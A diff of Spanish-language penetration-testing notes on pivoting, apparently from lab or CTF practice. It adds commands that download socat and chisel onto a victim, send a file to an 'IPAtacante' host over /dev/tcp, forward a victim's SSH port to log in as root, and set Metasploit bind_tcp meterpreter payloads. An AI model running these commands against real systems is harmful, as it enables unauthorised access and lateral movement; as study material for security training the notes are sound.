@@ -169,6 +169,29 @@ smbserver.py smbFolder /ruta -smb2support
 ```bash
 C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectadress=NodoMásCercano
 ```
+
+>Curiosidades
+
+- En una de las máquinas me he descargado socat y **he abierto el puerto ssh** redirigiéndolo por el puerto 6666 sin necesidad de sudo para poder poner la passwd que ya teníamos de **root**
+```bash
+# Desde la Victim
+wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/socat
+# o 
+
+cat < socat > /dev/tcp/IPAtacante/4343
+nc -nvlp 1234 > socat
+
+# O Atacante
+python3 -m http.server
+curl http://192.168.1.135:8000/chisel -o chisel
+
+# Víctima 
+./socat TCP-LISTEN:6666,reuseaddr,fork TCP:127.0.0.1:22
+
+# Desde el Atacante
+./socat TCP-LISTEN:4569,reuseaddr,fork TCP:IPVictim:6666
+ssh root@ipVictim
+```
 ## Metasploit
 
 1. Si comprometemos, sólo podremos **escanear desde dentro de metasploit**
@@ -180,7 +203,6 @@ sessions -n Red1-Victim1 -i 1
 ```
 - Scanner **TCP**
 ```bash
-
 use scanner/portscan/tcp
 set rhosts IPVictim2
 set PORTS 0-65535
@@ -197,12 +219,14 @@ meterpreter>portfwd add -l 1234 -p 80 -r IPVictim2
 
 - Escaneamos por el puerto dónde reenviamos, a ver que info de cada port
 ```bash
-db_nmap -sS -sV -p 1234 localhost
+db_nmap -sS -sV -p- 1234 localhost
 ```
 
  - Explotación
- >Abremos bind_shell y la víctima abre el Peuerto esperando conexiones
+ >Abriremos bind_shell y la víctima abre el Puerto esperando conexiones
 
 ```bash
 use elexploit que sea en ese puerto 80
 set payload /windows/meterpreter/bind_tcp
+set Rhosts IpVictima
+set LPORT PuertoQueNocoincida
